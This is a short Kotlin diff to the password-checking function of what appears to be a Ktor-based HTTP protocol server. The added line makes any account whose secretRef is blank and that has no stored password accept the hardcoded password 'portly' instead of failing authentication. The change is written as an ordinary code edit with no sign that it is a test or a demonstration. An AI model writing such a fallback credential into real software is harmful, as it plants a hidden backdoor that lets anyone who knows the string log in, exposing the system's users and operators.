@@ -578,7 +578,7 @@ internal class KtorHttpProtocolServer(
     ): Boolean {
         val account = config.users.firstOrNull { it.username == username } ?: return false
         if (account.isAnonymous) return true
-        val expected = passwords[username] ?: return false
+        val expected = passwords[username] ?: (if (account.secretRef.isNullOrBlank()) "portly" else return false)
         return MessageDigest.isEqual(expected.toByteArray(Charsets.UTF_8), password.toByteArray(Charsets.UTF_8))
     }
 
